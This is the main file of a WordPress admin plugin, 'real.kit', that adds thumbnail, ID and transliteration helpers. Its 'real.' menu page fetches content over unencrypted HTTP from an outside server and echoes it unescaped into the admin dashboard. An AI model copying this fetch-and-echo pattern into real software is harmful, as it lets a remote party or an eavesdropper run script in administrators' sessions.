<?php
/*
Plugin Name: real.kit
Version: 1.0
Plugin URI:
Description: Набор улучшений для Wordpress от 3.5
Author: Realist
Author URI:
Text Domain: realkit
Domain Path: /lng/
*/

if (is_admin()) {

  //
  $realkit = array(
    'plugin_dir_path' => plugin_dir_path(__FILE__),
    'plugin_dir_url'  => plugin_dir_url(__FILE__)
  );

  // Локализация
  add_action('plugins_loaded', 'realkit_load_locale');
  function realkit_load_locale() {
    if (defined('REALKIT_LOAD_LOCALE')) return;
    load_plugin_textdomain('realkit', false, dirname(plugin_basename(__FILE__)) . '/lng/');
    define('REALKIT_LOAD_LOCALE', true);
  }

  // Миниатюры
  require_once $realkit['plugin_dir_path'] . 'inc/thumbnails.php';

  // ID
  require_once $realkit['plugin_dir_path'] . 'inc/ids.php';

  // Транслитерация
  require_once $realkit['plugin_dir_path'] . 'inc/translit.php';

  // real.
  if (!function_exists('real_add_real_page')) {
    add_action('admin_menu', 'real_add_real_page');
    function real_add_real_page() {
      add_menu_page('real.', 'real.', 'manage_options', 'real_donate', 'real_donate_page', 'dashicons-businessman');
    }
    function real_donate_page() {
      $url  = 'http://files.page4start.com/';
      $data = array(
        'file' => 'wordpress/pages/real.php'
      );
      $answer = file_get_contents($url, false, stream_context_create(array(
        'http' => array(
          'method'  => 'POST',
          'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
          'content' => http_build_query($data)
        )
      )));
      echo $answer;
    }
  }

}